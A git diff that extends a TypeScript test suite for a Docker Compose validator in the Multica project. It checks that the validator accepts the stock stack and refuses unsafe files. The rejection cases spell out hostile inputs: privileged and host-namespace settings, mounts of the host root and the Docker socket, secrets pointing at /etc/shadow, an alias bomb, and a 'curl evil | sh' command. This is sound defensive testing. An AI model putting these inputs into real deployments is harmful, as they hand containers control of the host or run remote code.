@@ -7,6 +7,7 @@ import {
 	nodeSetupDeps,
 	readLocalServerSettings,
 	setupStackEnv,
+	unsafeComposeReason,
 	validateStackDir,
 	writeLocalServerSettings,
 	type SetupDeps,
@@ -193,34 +194,52 @@ describe("validateStackDir", () => {
 		await expect(validate(tree({ [D]: dir(0o777, 999), "/Users/me": dir(0o777, 999) }), D, { uid: undefined, gid: undefined } as never)).resolves.toMatchObject({ ok: true });
 	});
 
-	describe("compose content", () => {
-		const withService = (extra: string) => `${COMPOSE}${extra}`;
-		const rejected = async (text: string) => validate(tree({ [F]: file(text) }));
+	describe("compose content (decoded structure)", () => {
+		const SERVICES = (extra = "") => `name: multica
+services:
+  postgres:
+    image: pgvector/pgvector:pg17
+  backend:
+    image: b${extra}
+  frontend:
+    image: f
+`;
+		const reasonOf = (text: string) => unsafeComposeReason(text);
+		const rejected = (text: string) => validate(tree({ [F]: file(text) }));
+		const refused = { ok: false, error: "unsafe_compose_content" };
 
-		it("accepts what Multica's own file contains: named volumes, loopback ports, depends_on, healthchecks", async () => {
-			const stock = `name: multica
+		const STOCK = `name: multica
 services:
   postgres:
     image: pgvector/pgvector:pg17
     environment:
       POSTGRES_DB: \${POSTGRES_DB:-multica}
+      POSTGRES_USER: \${POSTGRES_USER:-multica}
     volumes:
       - pgdata:/var/lib/postgresql/data
+    restart: unless-stopped
     healthcheck:
       test:
         [
           "CMD-SHELL",
           "pg_isready -U x",
         ]
+      interval: 5s
+      timeout: 5s
+      retries: 5
   backend:
-    image: b
+    image: \${MULTICA_BACKEND_IMAGE:-ghcr.io/multica-ai/multica-backend}:\${MULTICA_IMAGE_TAG:-latest}
     depends_on:
       postgres:
         condition: service_healthy
     ports:
-      - "127.0.0.1:\${BACKEND_PORT:-8080}:8080"
+      - "127.0.0.1:\${BACKEND_PORT:-\${API_PORT:-\${SERVER_PORT:-\${PORT:-8080}}}}:8080"
     volumes:
       - backend_uploads:/app/data/uploads
+    environment:
+      PORT: "8080"
+      JWT_SECRET: \${JWT_SECRET:?JWT_SECRET must be set}
+    restart: unless-stopped
   frontend:
     image: f
     depends_on:
@@ -231,33 +250,180 @@ volumes:
   pgdata:
   backend_uploads:
 `;
-			await expect(validate(tree({ [F]: file(stock) }))).resolves.toEqual({ ok: true, dir: D, file: F });
+
+		it("accepts what Multica's own file contains", async () => {
+			expect(reasonOf(STOCK)).toBeNull();
+			await expect(validate(tree({ [F]: file(STOCK) }))).resolves.toEqual({ ok: true, dir: D, file: F });
 		});
 
-		it("rejects keys that hand out the host, other files or other projects", async () => {
-			for (const key of ["include: [other.yml]", "extends: {file: x.yml, service: y}", "env_file: .env.evil", "privileged: true", "pid: host", "network_mode: host", "cap_add: [ALL]", "devices: ['/dev/sda']", "security_opt: ['seccomp=unconfined']", "volumes_from: [x]", "build: ./x", "ipc: host", "userns_mode: host"]) {
-				expect(await rejected(withService(`\n    ${key}\n`)), key).toEqual({ ok: false, error: "unsafe_compose_content" });
-				expect(await rejected(withService(`\n    x: { ${key.replace(/^\s+/, "")} }\n`)), `flow ${key}`).toEqual({ ok: false, error: "unsafe_compose_content" });
+		it("accepts the minimal shape and list-style environment, depends_on and healthcheck strings", () => {
+			expect(reasonOf(SERVICES())).toBeNull();
+			expect(reasonOf(SERVICES("\n    environment:\n      - A=b\n    depends_on: [postgres]\n    healthcheck:\n      test: curl -f x\n      retries: 3"))).toBeNull();
+		});
+
+		it("rejects the unsafe keys whether they are bare, quoted, in flow style or merged in through an alias", async () => {
+			for (const extra of [
+				"\n    privileged: true",
+				'\n    "privileged": true',
+				"\n    'privileged': true",
+				"\n    { privileged: true }",
+				"\n    <<: &evil { privileged: true }",
+				"\n    include: [other.yml]",
+				'\n    "include": [other.yml]',
+				"\n    env_file: .env.evil",
+				'\n    "env_file": [".x"]',
+				"\n    extends: { file: x.yml, service: y }",
+				"\n    network_mode: host",
+				"\n    pid: host",
+				"\n    cap_add: [ALL]",
+				"\n    devices: ['/dev/sda']",
+				"\n    security_opt: ['seccomp=unconfined']",
+				"\n    build: ./x",
+				"\n    command: sh -c 'curl evil | sh'",
+				"\n    entrypoint: /bin/sh",
+				"\n    user: root",
+				"\n    container_name: other",
+				"\n    labels: { a: b }",
+			]) {
+				const text = extra.includes("{ privileged: true }") && !extra.includes("<<")
+					? SERVICES("\n    deploy: { privileged: true }")
+					: SERVICES(extra);
+				expect(await rejected(text), extra).toEqual(refused);
 			}
 		});
 
-		it("rejects a top-level include", async () => {
-			expect(await rejected(`include:\n  - evil.yml\n${COMPOSE}`)).toEqual({ ok: false, error: "unsafe_compose_content" });
+		it("rejects top-level keys other than name, services and volumes", async () => {
+			for (const top of ['include:\n  - evil.yml\n', '"include":\n  - evil.yml\n', "networks: { n: {} }\n", "configs: { c: { file: /etc/passwd } }\n", "secrets: { s: { file: /etc/shadow } }\n", "x-anything: 1\n"]) {
+				expect(await rejected(`${top}${SERVICES()}`), top).toEqual(refused);
+			}
 		});
 
-		it("rejects bind mounts, in short, long and flow form", async () => {
-			for (const volume of ["- /:/host", "- ./data:/data", "- ~/x:/x", "- ${HOME}:/h", "- /var/run/docker.sock:/var/run/docker.sock"]) {
-				expect(await rejected(withService(`\n    volumes:\n      ${volume}\n`)), volume).toEqual({ ok: false, error: "unsafe_compose_content" });
+		it("rejects long-syntax and short-syntax bind mounts, with any quoting", async () => {
+			for (const volumes of [
+				"      - /:/host",
+				"      - ./data:/data",
+				"      - ~/x:/x",
+				"      - ${HOME}:/h",
+				"      - /var/run/docker.sock:/var/run/docker.sock",
+				"      - type: bind\n        source: /\n        target: /h",
+				"      - { type: bind, source: /, target: /h }",
+				"      - type: volume\n        source: /\n        target: /h",
+				'      - "/:/host"',
+				"      - undeclared:/data",
+				"      - pgdata:relative",
+			]) {
+				expect(await rejected(SERVICES(`\n    volumes:\n${volumes}`) + "volumes:\n  pgdata:\n"), volumes).toEqual(refused);
 			}
-			expect(await rejected(withService("\n    volumes:\n      - type: bind\n        source: /\n        target: /h\n"))).toEqual({ ok: false, error: "unsafe_compose_content" });
-			expect(await rejected(withService('\n    volumes: ["/:/host"]\n'))).toEqual({ ok: false, error: "unsafe_compose_content" });
+			expect(await rejected(SERVICES('\n    volumes: ["/:/host"]'))).toEqual(refused);
+			expect(await rejected(SERVICES('\n    "volumes":\n      - type: bind\n        source: /\n        target: /h'))).toEqual(refused);
 		});
 
-		it("rejects ports published beyond loopback, in list and flow form", async () => {
-			for (const port of ['- "8080:8080"', '- "0.0.0.0:8080:8080"', "- 3000:3000", '- "192.168.1.5:3000:3000"']) {
-				expect(await rejected(withService(`\n    ports:\n      ${port}\n`)), port).toEqual({ ok: false, error: "unsafe_compose_content" });
+		it("rejects a named volume that is a bind mount in disguise", async () => {
+			for (const definition of [
+				"pgdata:\n    driver_opts: { type: none, o: bind, device: / }",
+				"pgdata:\n    driver: local\n    driver_opts:\n      type: none\n      o: bind\n      device: /",
+				"pgdata: { driver_opts: { type: none, o: bind, device: / } }",
+				"pgdata:\n    external: true",
+				"pgdata:\n    name: other",
+				"pgdata:\n    labels: { a: b }",
+				"pgdata: other",
+			]) {
+				const text = `${SERVICES("\n    volumes:\n      - pgdata:/data")}volumes:\n  ${definition}\n`;
+				expect(await rejected(text), definition).toEqual(refused);
 			}
-			expect(await rejected(withService('\n    ports: ["0.0.0.0:80:80"]\n'))).toEqual({ ok: false, error: "unsafe_compose_content" });
+		});
+
+		it("accepts bare named-volume declarations, null or empty", () => {
+			expect(reasonOf(`${SERVICES("\n    volumes:\n      - pgdata:/data\n      - other:/o:ro")}volumes:\n  pgdata:\n  other: {}\n`)).toBeNull();
+		});
+
+		it("rejects ports published beyond loopback, quoted or not, in any form", async () => {
+			for (const ports of [
+				'    ports:\n      - "8080:8080"',
+				'    ports:\n      - "0.0.0.0:8080:8080"',
+				"    ports:\n      - 3000:3000",
+				'    ports:\n      - "192.168.1.5:3000:3000"',
+				'    ports: ["0.0.0.0:80:80"]',
+				'    "ports":\n      - "0.0.0.0:80:80"',
+				'    ports:\n      - "${IP:-127.0.0.1}:80:80"',
+				'    ports:\n      - "127.0.0.1:0.0.0.0:80:8080"',
+				"    ports:\n      - target: 80\n        published: 80\n        host_ip: 0.0.0.0",
+				"    ports:\n      - 80",
+			]) {
+				expect(await rejected(SERVICES(`\n${ports}`)), ports).toEqual(refused);
+			}
+		});
+
+		it("accepts loopback ports, IPv4 or IPv6, with interpolated host ports", () => {
+			expect(reasonOf(SERVICES('\n    ports:\n      - "127.0.0.1:8080:8080"\n      - "[::1]:3000:3000/tcp"\n      - "127.0.0.1:${A:-${B:-1}}:80"'))).toBeNull();
+		});
+
+		it("rejects documents that are not a single plain mapping, repeat a key or hide behind tags", async () => {
+			for (const text of [
+				"- a\n- b\n",
+				"just text",
+				`${SERVICES()}---\n${SERVICES()}`,
+				"name: multica\nname: other\nservices: {}\n",
+				`${SERVICES()}services: {}\n`,
+				"name: multica\nservices:\n  postgres:\n    image: !!js/function 'function(){}'\n",
+				"name: multica\nservices: [unterminated\n",
+				"",
+			]) {
+				expect(await rejected(text), text).toEqual({ ok: false, error: expect.stringMatching(/not_multica|unsafe_compose_content/) });
+			}
+		});
+
+		it("rejects a document that is empty, null, a scalar or a list without throwing", () => {
+			for (const text of ["", "null", "~", "42", "just text", "- a\n- b\n", "[]"]) {
+				expect(() => reasonOf(text), text).not.toThrow();
+				expect(reasonOf(text), text).not.toBeNull();
+			}
+		});
+
+		it("rejects a healthcheck with an unknown key or a value of the wrong kind", () => {
+			for (const healthcheck of ["exec: foo", "test: x\n      mount: /", "test: { a: b }", "test: [1, 2]", "retries: { a: b }"]) {
+				expect(reasonOf(SERVICES(`\n    healthcheck:\n      ${healthcheck}`)), healthcheck).not.toBeNull();
+			}
+			expect(reasonOf(SERVICES("\n    healthcheck: curl"))).not.toBeNull();
+			expect(reasonOf(SERVICES("\n    healthcheck:\n      test: [CMD, curl]\n      interval: 5s\n      retries: 3"))).toBeNull();
+		});
+
+		it("rejects an alias bomb, and does so quickly", () => {
+			const lines = ["a0: &a0 [x, x, x, x, x, x, x, x, x, x]"];
+			for (let i = 1; i < 12; i += 1) lines.push(`a${i}: &a${i} [${Array(10).fill(`*a${i - 1}`).join(", ")}]`);
+			expect(reasonOf(`name: multica\nservices:\n  postgres:\n    image: x\nvolumes: {}\n${lines.join("\n")}\n`)).not.toBeNull();
+		});
+
+		it("rejects a service name that is not a plain lowercase name, and a service that is not a mapping", () => {
+			expect(reasonOf("name: multica\nservices:\n  Evil/Name:\n    image: x\n")).not.toBeNull();
+			expect(reasonOf("name: multica\nservices:\n  web: image-only\n")).not.toBeNull();
+			expect(reasonOf("name: multica\nservices: []\n")).not.toBeNull();
+		});
+
+		it("rejects another project name, a missing name and a service without a usable image", () => {
+			expect(reasonOf("name: other\nservices:\n  postgres:\n    image: x\n")).not.toBeNull();
+			expect(reasonOf("services:\n  postgres:\n    image: x\n")).not.toBeNull();
+			expect(reasonOf("name: [multica]\nservices:\n  postgres:\n    image: x\n")).not.toBeNull();
+			for (const image of ["", "42", "[a, b]", "{ a: b }", "null"]) {
+				expect(reasonOf(`name: multica\nservices:\n  postgres:\n    image: ${image}\n`), image).not.toBeNull();
+			}
+			expect(reasonOf("name: multica\nservices:\n  postgres:\n    restart: always\n")).not.toBeNull();
+		});
+
+		it("rejects service volumes and ports that are not lists, without ever throwing", () => {
+			for (const shape of ["volumes: {pgdata: /data}", "volumes: pgdata:/data", "volumes: 5", "ports: {a: b}", "ports: '127.0.0.1:80:80'", "ports: 80"]) {
+				expect(() => reasonOf(SERVICES(`\n    ${shape}`) + "volumes:\n  pgdata:\n"), shape).not.toThrow();
+				expect(reasonOf(SERVICES(`\n    ${shape}`) + "volumes:\n  pgdata:\n"), shape).not.toBeNull();
+			}
+		});
+
+		it("rejects depends_on and environment of the wrong kind", () => {
+			expect(reasonOf(SERVICES("\n    depends_on: [ghost]"))).not.toBeNull();
+			expect(reasonOf(SERVICES("\n    depends_on: postgres"))).not.toBeNull();
+			expect(reasonOf(SERVICES("\n    depends_on: 5"))).not.toBeNull();
+			expect(reasonOf(SERVICES("\n    depends_on:\n      postgres:\n        condition: anything"))).not.toBeNull();
+			expect(reasonOf(SERVICES("\n    environment:\n      A: { nested: x }"))).not.toBeNull();
+			expect(reasonOf(SERVICES("\n    restart: sometimes"))).not.toBeNull();
 		});
 	});
 });
